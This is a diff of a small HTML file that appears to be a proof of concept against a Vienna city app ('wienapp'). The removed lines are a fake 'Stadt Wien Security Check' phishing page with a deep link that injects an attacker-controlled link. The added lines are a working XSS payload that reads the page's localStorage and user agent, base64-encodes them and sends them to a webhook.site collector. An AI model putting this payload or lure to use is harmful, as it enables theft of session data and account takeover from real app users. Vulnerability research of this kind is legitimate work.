@@ -1,28 +1,25 @@
 <!DOCTYPE html>
 <html>
-<head>
-<title>Security Verification</title>
-</head>
-
 <body>
+<h2>PoC Executed</h2>
 
-<h2>Stadt Wien Security Check</h2>
+<script>
+// Visual proof
+alert("XSS via MitM + CSP bypass");
 
-<p>Please verify your account or open the latest news.</p>
+// Collect sensitive data
+let data = {
+    localStorage: JSON.stringify(localStorage),
+    userAgent: navigator.userAgent
+};
 
-<br>
+// Send to your endpoint (optional)
+fetch("https://webhook.site/YOUR-ID?data=" + btoa(JSON.stringify(data)))
+  .catch(()=>{});
 
-<!-- Open news section -->
-<a href="wienapp:///news">
-<button>Open Wien News</button>
-</a>
-
-<br><br>
-
-<!-- Exploit link -->
-<a href="wienapp://app/markdown/?title=Security&markdown=%5BClick%5D(https://attacker-mein.wien.gv.at)">
-<button>Verify Account</button>
-</a>
+// Show on screen (for screenshot proof)
+document.body.innerHTML += "<pre>" + JSON.stringify(data, null, 2) + "</pre>";
+</script>
 
 </body>
 </html>
